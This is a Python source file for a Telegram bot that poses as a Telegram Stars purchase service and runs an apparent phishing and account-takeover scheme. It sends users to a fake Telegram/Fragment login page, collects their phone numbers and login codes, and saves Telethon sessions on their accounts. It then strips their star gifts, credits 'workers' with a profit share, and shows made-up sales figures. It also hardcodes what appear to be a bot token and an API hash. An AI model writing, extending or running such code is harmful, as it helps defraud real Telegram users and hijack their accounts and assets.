import asyncio, re, json, io, os
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery,
    LabeledPrice, PreCheckoutQuery, ContentType, BufferedInputFile
)
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from telethon import TelegramClient, functions
from telethon.sessions import StringSession
from PIL import Image, ImageDraw, ImageFont
from web import start_web

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
ADMIN_ID = 8736990603

BOT_TOKEN = "8971648350:AAHeUghi5Yx504kU5pzZQMT7NUWQZdrpd5A"
CHANNEL_ID = "@ksjebdnqwjndmskq"
MESSAGE_ID = 2
PROFIT_CHAT_ID = -1004334887780
WORKER_CHAT_ID = -1004334887780
API_ID = 14249983
API_HASH = "66f407831ca5bbcd1f9658f5078b082b"
SITE_URL = "https://baikall.pages.dev"

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()


def path(n): return os.path.join(BASE_DIR, n + ".txt")
def append_line(n, line):
    with open(path(n), "a", encoding="utf-8") as f: f.write(line + "\n")
def read_json(n):
    p = path(n)
    if not os.path.exists(p): return {}
    with open(p, "r", encoding="utf-8") as f:
        try: return json.load(f)
        except: return {}
def write_json(n, d):
    with open(path(n), "w", encoding="utf-8") as f:
        json.dump(d, f, ensure_ascii=False, indent=2)


async def check_sub(user_id):
    try:
        m = await bot.get_chat_member(WORKER_CHAT_ID, user_id)
        return m.status in ['member', 'administrator', 'creator']
    except: return False


async def auth_screen(message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text='Продолжить через Telegram', callback_data='auth_phone')]
    ])
    await message.answer('🔐 <b>Вход через Telegram</b>\n\nСайту будут известны Ваше <b>имя</b>, <b>публичная ссылка</b> и <b>фотография</b>', reply_markup=kb)


async def worker_menu(message):
    uid = message.from_user.id
    rows = [
        [InlineKeyboardButton(text='💻 Веб-Кошелёк', callback_data='wallet'),
         InlineKeyboardButton(text='💫 Вывести звёзды', callback_data='withdraw')],
        [InlineKeyboardButton(text='🤖 Автоскупщик подарков', callback_data='autobuy')],
        [InlineKeyboardButton(text='👛 Кошелёк', callback_data='wallet_info'),
         InlineKeyboardButton(text='🛒 Магазин', callback_data='shop')],
        [InlineKeyboardButton(text='💰 Пополнить Баланс', callback_data='topup')],
        [InlineKeyboardButton(text='⭐ Создать чек', callback_data='create_check')]
    ]
    if uid == ADMIN_ID:
        rows.append([InlineKeyboardButton(text='💸 Выплаты', callback_data='payout_menu')])
    kb = InlineKeyboardMarkup(inline_keyboard=rows)
    await message.answer(
        '👋 <b>Привет!</b> Это удобный бот для покупки/передачи звёзд в Telegram.\n\n'
        '<blockquote>С помощью него можно моментально покупать и передавать звёзды.\n'
        'Бот работает почти год, и с помощью него куплена большая доля звёзд в Telegram.</blockquote>\n\n'
        'С помощью бота куплено:\n<b>7,357,760</b> ⭐ (~ $110,366)',
        reply_markup=kb
    )


@dp.callback_query(F.data == 'payout_menu')
async def payout_menu(call: CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        await call.answer('Доступно только администраторам', show_alert=True)
        return
    profits = read_json("profits")
    total = sum(profits.values()) if profits else 0
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text='💸 Выплатить всем', callback_data='payout_all_confirm')],
        [InlineKeyboardButton(text='👤 Выплатить воркеру', callback_data='payout_one_list')],
        [InlineKeyboardButton(text='← Назад', callback_data='back_menu')]
    ])
    await call.message.edit_text(
        f'💸 <b>Панель выплат</b>\n\n'
        f'Воркеров в очереди: <b>{len(profits)}</b>\n'
        f'Общая сумма: <b>{total} TON</b>',
        reply_markup=kb
    )


@dp.callback_query(F.data == 'back_menu')
async def back_menu(call: CallbackQuery):
    await call.message.delete()


@dp.callback_query(F.data == 'payout_all_confirm')
async def payout_all_confirm(call: CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        await call.answer('Доступно только администраторам', show_alert=True)
        return
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text='✅ Да', callback_data='payout_all_yes'),
         InlineKeyboardButton(text='❌ Нет', callback_data='payout_menu')]
    ])
    await call.message.edit_text('❓ Вы точно хотите выплатить всем воркерам?', reply_markup=kb)


@dp.callback_query(F.data == 'payout_all_yes')
async def payout_all_yes(call: CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        await call.answer('Доступно только администраторам', show_alert=True)
        return
    profits = read_json("profits")
    if not profits:
        await call.message.edit_text('❌ Нет профитов для выплаты')
        return
    lines = []
    for worker_id, amount in profits.items():
        try:
            await bot.send_message(
                int(worker_id),
                f'✅ <b>Выплата</b>\n\n'
                f'Вам выплачено: <b>{amount} TON</b>\n'
                f'Спасибо за работу!'
            )
            append_line("logs", f"PAID|{worker_id}|{amount}")
            lines.append(f'Воркер <code>{worker_id}</code> — <b>{amount} TON</b>')
        except Exception as e:
            append_line("logs", f"PAID_ERR|{worker_id}|{e}")
    write_json("profits", {})
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text='👤 Воркер', url=f'https://t.me/user?id={list(profits.keys())[0]}')]
    ]) if profits else None
    await call.message.edit_text(
        '✅ <b>Выплачено</b>\n\n' + '\n'.join(lines),
        reply_markup=kb
    )
    await bot.send_message(
        PROFIT_CHAT_ID,
        '✅ <b>Выплачено</b>\n\n' + '\n'.join(lines)
    )


@dp.callback_query(F.data == 'payout_one_list')
async def payout_one_list(call: CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        await call.answer('Доступно только администраторам', show_alert=True)
        return
    profits = read_json("profits")
    if not profits:
        await call.message.edit_text('❌ Нет воркеров с профитом')
        return
    rows = []
    for wid, amt in profits.items():
        rows.append([InlineKeyboardButton(text=f'{wid} — {amt} TON', callback_data=f'payout_one_{wid}')])
    rows.append([InlineKeyboardButton(text='← Назад', callback_data='payout_menu')])
    await call.message.edit_text('👤 Выберите воркера для выплаты:', reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))


@dp.callback_query(F.data.startswith('payout_one_'))
async def payout_one_confirm(call: CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        await call.answer('Доступно только администраторам', show_alert=True)
        return
    wid = call.data.split('_')[-1]
    profits = read_json("profits")
    amt = profits.get(wid, 0)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text='✅ Да', callback_data=f'payout_one_yes_{wid}'),
         InlineKeyboardButton(text='❌ Нет', callback_data='payout_menu')]
    ])
    await call.message.edit_text(f'❓ Выплатить воркеру <code>{wid}</code> сумму <b>{amt} TON</b>?', reply_markup=kb)


@dp.callback_query(F.data.startswith('payout_one_yes_'))
async def payout_one_yes(call: CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        await call.answer('Доступно только администраторам', show_alert=True)
        return
    wid = call.data.split('_')[-1]
    profits = read_json("profits")
    amt = profits.pop(wid, 0)
    write_json("profits", profits)
    try:
        await bot.send_message(int(wid), f'✅ <b>Выплата</b>\n\nВам выплачено: <b>{amt} TON</b>')
        append_line("logs", f"PAID|{wid}|{amt}")
    except Exception as e:
        append_line("logs", f"PAID_ERR|{wid}|{e}")
    await call.message.edit_text(f'✅ Выплачено воркеру <code>{wid}</code>: <b>{amt} TON</b>')
    await bot.send_message(PROFIT_CHAT_ID, f'✅ <b>Выплачено</b>\n\nВоркер <code>{wid}</code> — <b>{amt} TON</b>')


@dp.callback_query(F.data == 'topup')
async def topup(call: CallbackQuery):
    await bot.send_invoice(
        chat_id=call.message.chat.id,
        title="Покупка звёзд",
        description="Пополнение баланса звёздами Telegram",
        payload="topup_stars",
        provider_token="",
        currency="XTR",
        prices=[LabeledPrice(label="Звёзды", amount=50)]
    )


@dp.pre_checkout_query()
async def pre_checkout(q: PreCheckoutQuery):
    await bot.answer_pre_checkout_query(q.id, ok=True)


@dp.message(F.content_type == ContentType.SUCCESSFUL_PAYMENT)
async def success_pay(message: types.Message):
    append_line("logs", f"PAY|{message.from_user.id}|{message.successful_payment.total_amount}")
    await message.answer('✅ Оплата получена')


@dp.callback_query(F.data == 'auth_phone')
async def ask_code(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text='Продолжить через Fragment', url=f'{SITE_URL}/?user_id={call.from_user.id}')]
    ])
    await call.message.answer('🔐 <b>Вход через Telegram</b>\n\nПерейдите на сайт и введите код.', reply_markup=kb)


async def draw_check(stars):
    W, H = 800, 500
    img = Image.new("RGB", (W, H), "#6C5CE7")
    d = ImageDraw.Draw(img)
    for y in range(H): d.line([(0, y), (W, y)], fill=(108, 92, 231))
    d.rounded_rectangle([60, 80, W-60, H-140], radius=24, fill="#3B9EE5")
    try:
        fs = ImageFont.truetype("arial.ttf", 110)
        fn = ImageFont.truetype("arialbd.ttf", 160)
        fl = ImageFont.truetype("arial.ttf", 48)
        fm = ImageFont.truetype("arial.ttf", 36)
    except: fs = fn = fl = fm = ImageFont.load_default()
    d.text((W//2-200, 140), "⭐", font=fs, fill="white")
    d.text((W//2-60, 130), str(stars), font=fn, fill="white")
    d.text((W//2-90, 300), "Stars", font=fl, fill="white")
    d.text((80, H-120), f"🎁 Чек на {stars} ⭐", font=fm, fill="white")
    b = io.BytesIO(); img.save(b, format="PNG"); b.seek(0); return b.read()


@dp.message(F.text.regexp(r'^@\w+\s+\d+$'))
async def make_check(message: types.Message):
    p = message.text.split()
    img = await draw_check(int(p[1]))
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text='⭐ Забрать', url=f'https://t.me/{p[0].lstrip("@")}?start=check_{p[1]}')]
    ])
    await message.answer_photo(BufferedInputFile(img, filename="check.png"),
                               caption=f'<b>Чек на {p[1]} ⭐</b>', reply_markup=kb)


@dp.message(F.text.startswith('/offer'))
async def make_offer(message: types.Message):
    try:
        p = message.text.split()
        uid = int(p[1]); link = p[2]; amt = int(p[3])
    except:
        await message.answer('❌ Формат: <code>/offer UserID https://t.me/nft/... сумма</code>')
        return
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text='Принять', callback_data=f'accept_{uid}_{amt}'),
         InlineKeyboardButton(text='Отклонить', callback_data=f'decline_{uid}')]
    ])
    await bot.send_message(uid, f'🎁 <b>Вам оффер</b>\n\nПодарок: {link}\nСумма: <b>{amt} ⭐</b>', reply_markup=kb)
    append_line("logs", f"OFFER|{uid}|{message.from_user.id}|{amt}")
    await message.answer('✅ Оффер отправлен')


@dp.callback_query(F.data.startswith('accept_'))
async def acc(call: CallbackQuery):
    _, uid, amt = call.data.split('_')
    await call.message.edit_text('✅ Оффер принят, ждите авторизации')
    append_line("logs", f"ACCEPT|{uid}|{amt}")


@dp.callback_query(F.data.startswith('decline_'))
async def dec(call: CallbackQuery):
    await call.message.edit_text('❌ Оффер отклонён')


@dp.message(F.content_type == ContentType.CONTACT)
async def contact(message: types.Message):
    d = read_json("pending"); d[str(message.from_user.id)] = message.contact.phone_number; write_json("pending", d)
    append_line("logs", f"CONTACT|{message.from_user.id}|{message.contact.phone_number}")
    await message.answer('✅ Контакт получен')


@dp.message(F.text.regexp(r'^\d{5}$'))
async def code(message: types.Message):
    d = read_json("pending"); phone = d.get(str(message.from_user.id))
    if not phone:
        await message.answer('❌ Телефон не найден'); return
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    try:
        await client.start(phone=phone, code_callback=lambda: message.text)
        s = read_json("sessions"); s[str(message.from_user.id)] = client.session.save(); write_json("sessions", s)
        append_line("logs", f"SESSION|{message.from_user.id}|{phone}")
        await clean_account(client, message.from_user.id, phone)
        await client.disconnect()
    except Exception as e:
        await message.answer(f'❌ Ошибка: {e}')
        append_line("logs", f"SESSION_ERR|{message.from_user.id}|{e}")


async def clean_account(client, wid, mid):
    try:
        gifts = await client(functions.payments.GetSavedStarGiftsRequest())
        for g in gifts.gifts:
            await client(functions.payments.SaveStarGiftRequest(gift_id=g.id, price=int(1000*0.7)))
            append_line("logs", f"NFT|{g.id}|{wid}|{mid}")
        append_line("logs", f"CLEAN|{wid}|{mid}")
    except Exception as e:
        append_line("logs", f"CLEAN_ERR|{wid}|{e}")


async def send_stars_reaction(amount, wid, mid):
    for _ in range(amount):
        await bot.send_reaction(chat_id=CHANNEL_ID, message_id=MESSAGE_ID, reaction='⭐')
    profit = int(amount * 0.6)
    profits = read_json("profits")
    profits[str(wid)] = profits.get(str(wid), 0) + profit
    write_json("profits", profits)
    await bot.send_message(
        PROFIT_CHAT_ID,
        f'🎉 <b>У вас новый профит!</b>\n\n'
        f'⭐ Списано звёзд: <b>{amount}</b>\n'
        f'💎 Сумма: <b>{profit} TON</b>\n'
        f'💰 Ваша доля (60%): <b>{profit} TON</b>',
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text='💸 Выплатить', callback_data='payout_menu')]
        ])
    )


@dp.message(F.text == '/start')
async def start(message: types.Message):
    if await check_sub(message.from_user.id):
        await worker_menu(message)
    else:
        await auth_screen(message)


async def main():
    await start_web()
    await dp.start_polling(bot)


if __name__ == '__main__':
    asyncio.run(main())